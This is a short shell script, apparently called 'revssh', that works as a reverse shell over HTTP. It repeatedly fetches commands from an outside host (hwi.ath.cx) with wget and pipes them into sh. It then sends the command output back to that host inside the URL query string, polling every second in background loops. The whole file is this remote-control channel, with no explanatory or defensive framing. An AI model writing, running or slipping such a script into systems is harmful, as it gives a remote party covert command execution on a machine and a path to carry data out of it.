INPUT="/tmp/revssh-server-input.txt"
OUTPUT="/tmp/revssh-server-output.txt"

## Read input to shell from local file
while true; do
	while test ! -f "$INPUT"; do
		sleep 1
	done
	cat "$INPUT" && rm -f "$INPUT"
done |

sh |

## and pass output to another file
while read LINE; do
	echo "$LINE" >> "$OUTPUT"
done &

## and in parallel...

## Send output (from file) to http server, and get user input back (to file)
while true; do
	OUTPUTTOSEND=`cat "$OUTPUT" 2>/dev/null` && rm -f "$OUTPUT"
	cursegreen
	printf "$OUTPUTTOSEND"
	cursenorm
	wget "http://hwi.ath.cx/cgi-bin/joey/revssh?OUTPUT=$OUTPUTTOSEND" -O "$INPUT" 2>/dev/null
	cursered
	cat "$INPUT" 2>/dev/null
	cursenorm
	sleep 1
done &

wait
